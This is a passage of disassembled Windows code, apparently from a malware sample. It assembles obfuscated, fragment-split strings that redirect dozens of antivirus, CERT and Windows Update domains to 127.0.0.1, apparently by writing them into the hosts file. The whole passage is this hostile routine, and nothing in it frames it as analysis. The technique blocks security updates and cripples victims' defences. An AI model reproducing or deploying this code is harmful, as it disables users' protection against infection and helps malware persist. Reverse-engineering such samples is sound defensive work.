  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00419238h
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041999Ch ; "n"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AB5Ch
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041ABCCh ; "ec.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_38
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_38
  push eax
  lea ecx, var_34
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 0000005Ch
  push 0041ACB8h ; "127.0.0.1  security.sy"
  push 0041A8E8h ; "m"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AB7Ch ; "ant"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041ABCCh ; "ec.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_30
  push eax
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  mov var_4, 0000005Dh
  push 0041ACECh ; "127.0.0.1  shop.sy"
  push 0041AD18h ; "man"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AD24h ; "tec"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AD30h ; "sto"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041AD3Ch ; "re.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_34
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_34
  push ecx
  lea edx, var_30
  push edx
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000005Eh
  push 0041AD4Ch ; "127.0.0.1  sym"
  push 0041AB7Ch ; "ant"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041ABCCh ; "ec.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000005Fh
  push 0041AD70h ; "127.0.0.1  securityresponse.sym"
  push 0041AB7Ch ; "ant"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041ABCCh ; "ec.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000060h
  push 0041ADB4h ; "127.0.0.1  liveupdate.sym"
  push 0041AB7Ch ; "ant"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041ABCCh ; "ec.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041ADECh ; "liveupdate.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_30
  push eax
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  mov var_4, 00000061h
  push 0041AE34h ; "127.0.0.1  service1.sym"
  push 0041AB7Ch ; "ant"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041ABCCh ; "ec.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000062h
  push 0041AE68h ; "127.0.0.1  ftp.sym"
  push 0041AB7Ch ; "ant"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041ABCCh ; "ec.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000063h
  push 0041AE94h ; "127.0.0.1  rad"
  push 0041AEB8h ; "s.mc"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AEC8h ; "afee"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AED8h ; ".com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000064h
  push 0041AEE8h ; "127.0.0.1  hom"
  push 0041AF0Ch ; "e.mca"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AF1Ch ; "fee.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000065h
  push 0041AF30h ; "127.0.0.1  es.mca"
  push 0041AF1Ch ; "fee.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000066h
  push 0041AF58h ; "127.0.0.1  la.mca"
  push 0041AF1Ch ; "fee.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000067h
  push 0041AF80h ; "127.0.0.1  us.mca"
  push 0041AF1Ch ; "fee.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000068h
  push 0041AFA8h ; "127.0.0.1  download.mca"
  push 0041AF1Ch ; "fee.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000069h
  push 0041AFFCh ; "127.0.0.1  dispatch.mca"
  push 0041AF1Ch ; "fee.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Ah
  push 0041B030h ; "127.0.0.1  mast.mca"
  push 0041AF1Ch ; "fee.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Bh
  push 0041B05Ch ; "127.0.0.1  www.mca"
  push 0041AF1Ch ; "fee.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Ch
  push 0041B088h ; "127.0.0.1  mca"
  push 0041AF1Ch ; "fee.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Dh
  push 0041B0ACh ; "127.0.0.1  dlpro.avira.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000006Eh
  push 0041B0E8h ; "127.0.0.1  dl1.pro.antivir.de"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000006Fh
  push 0041B128h ; "127.0.0.1  dl2.pro.antivir.de"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000070h
  push 0041B168h ; "127.0.0.1  dl3.pro.antivir.de"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000071h
  push 0041B1D8h ; "127.0.0.1  dl1.antivir.net"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000072h
  push 0041B214h ; "127.0.0.1  dl2.antivir.net"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000073h
  push 0041B250h ; "127.0.0.1  dl3.antivir.net"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000074h
  push 0041B28Ch ; "127.0.0.1  dl2.antivir-pe.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000075h
  push 0041B2CCh ; "127.0.0.1  fr"
  push 0041B2ECh ; "ee"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B2F8h ; "av.net"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000076h
  push 00419A78h ; "127.0.0.1  a"
  push 00419A98h
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B30Ch ; "ga"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041B318h ; "te.net"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000077h
  push 0041B32Ch ; "127.0.0.1  tren"
  push 0041B350h ; "dm"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B35Ch ; "ic"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041B368h ; "ro.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000078h
  push 0041B1A8h ; "127.0.0.1  www.tre"
  push 0041B37Ch ; "ndm"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B35Ch ; "ic"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041B368h ; "ro.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000079h
  push 0041AE10h ; "127.0.0.1  hou"
  push 0041AFDCh ; "secall.trend"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B388h ; "micr"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041AC60h ; "o.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000007Ah
  push 0041B39Ch ; "127.0.0.1  es.tr"
  push 0041B3C4h ; "endm"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B3D4h ; "icro.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 0000007Bh
  push 0041B3ECh ; "127.0.0.1  la.tre"
  push 00419ED4h ; "nd"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B414h ; "mic"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041B368h ; "ro.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000007Ch
  push 0041B420h ; "127.0.0.1  www.tr"
  push 0041B448h ; "endse"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B458h ; "cure.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 0000007Dh
  push 0041B470h ; "127.0.0.1  tre"
  push 0041B494h ; "ndse"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B458h ; "cure.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 0000007Eh
  push 0041B4A4h ; "127.0.0.1  pandasoftware.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000007Fh
  push 0041B4E4h ; "127.0.0.1  www.pandasoftware.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000080h
  push 0041B568h ; "127.0.0.1  www.pandasecurity.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000081h
  push 0041B5B0h ; "127.0.0.1  avg.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000082h
  push 0041B5DCh ; "127.0.0.1  guru.avg.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000083h
  push 0041B610h ; "127.0.0.1  free.avg.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000084h
  push 0041B644h ; "127.0.0.1  update.avg.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000085h
  push 0041B67Ch ; "127.0.0.1  free.grisoft.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000086h
  push 0041B6B8h ; "127.0.0.1  www.grisoft.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000087h
  push 0041B6F4h ; "127.0.0.1  grisoft.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000088h
  push 0041B738h ; "127.0.0.1  update.grisoft.cz"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000089h
  push 0041B778h ; "127.0.0.1  backup.grisoft.cz"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Ah
  push 0041B7B8h ; "127.0.0.1  akamai.grisoft.cz"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Bh
  push 0041B7F8h ; "127.0.0.1  clamav.net"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Ch
  push 0041B828h ; "127.0.0.1  www.clamav.net"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Dh
  push 0041B860h ; "127.0.0.1  w32.clamav.net"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Eh
  push 0041B898h ; "127.0.0.1  free-av.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 0000008Fh
  push 0041B8CCh ; "127.0.0.1  www.free-av.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000090h
  push 0041B52Ch ; "127.0.0.1  www.avast.com"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000091h
  push 00419C24h ; "127.0.0.1  ava"
  push 0041B728h ; "st.c"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041AA44h ; "om"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000092h
  push 0041B914h ; "127.0.0.1  ce"
  push 0041B934h ; "rt.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000093h
  push 0041B948h ; "127.0.0.1  www.ce"
  push 0041B934h ; "rt.org"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000094h
  push 0041AB3Ch ; "127.0.0.1  up"
  push 0041B970h ; "date.micr"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 004198ECh ; "os"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041B988h ; "oft.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_2C
  push ecx
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000095h
  push 0041B99Ch ; "127.0.0.1  win"
  push 0041B9C0h ; "dowsup"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B9D4h ; "date.mi"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041B9E8h ; "cro"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 0041B9F4h ; "soft.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_30
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_30
  push ecx
  lea edx, var_2C
  push edx
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000004h
  call [00401150h]
  add esp, 00000014h
  mov var_4, 00000096h
  push 0041BA0Ch ; "127.0.0.1  www.mic"
  push 0041BA38h ; "ros"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B988h ; "oft.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000097h
  push 0041BA44h ; "127.0.0.1  mi"
  push 0041BA64h ; "cros"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041B988h ; "oft.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 00000098h
  push 0041AA70h ; "127.0.0.1  www.n"
  push 0041BA74h ; "etwor"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BA84h ; "kasso"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041BA94h ; "ciates.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 00000099h
  push 0041BAB0h ; "127.0.0.1 n"
  push 0041BA74h ; "etwor"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BA84h ; "kasso"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 0041BA94h ; "ciates.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_2C
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_2C
  push eax
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000003h
  call [00401150h]
  add esp, 00000010h
  mov var_4, 0000009Ah
  push 0041BACCh ; "127.0.0.1  www.c"
  push 0041BAF4h ; "a.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Bh
  push 0041BB04h ; "127.0.0.1  c"
  push 0041BAF4h ; "a.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Ch
  push 0041BB24h ; "127.0.0.1  sa"
  push 0041BB44h ; "rc.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Dh
  push 0041BB58h ; "127.0.0.1  www.sa"
  push 0041BB44h ; "rc.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Eh
  push 0041BB80h ; "127.0.0.1  www.s"
  push 0041BBA8h ; "oph"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BBB4h ; "os.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 0000009Fh
  push 0041A9FCh ; "127.0.0.1  s"
  push 0041BBA8h ; "oph"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BBB4h ; "os.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 000000A0h
  push 0041BBC8h ; "127.0.0.1  www.vir"
  push 0041BBF4h ; "usli"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BC04h ; "st.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_28
  push ecx
  lea edx, var_24
  push edx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 000000A1h
  push 00419DD4h ; "127.0.0.1  vir"
  push 0041BC18h ; "usl"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BC24h ; "ist.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea eax, var_28
  push eax
  lea ecx, var_24
  push ecx
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 000000A2h
  push 0041BC38h ; "127.0.0.1  f-secu"
  push 0041BC60h ; "re.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A3h
  push 0041BC88h ; "127.0.0.1  www.f-se"
  push 0041BCB4h ; "cu"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 0041BC60h ; "re.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_28
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea edx, var_28
  push edx
  lea eax, var_24
  push eax
  push 00000002h
  call [00401150h]
  add esp, 0000000Ch
  mov var_4, 000000A4h
  push 0041BCC0h ; "127.0.0.1  f-pr"
  push 0041BCE4h ; "ot.com"
  call [00401044h]
  mov edx, eax
  lea ecx, var_24
  call [004011ACh]
  push eax
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A5h
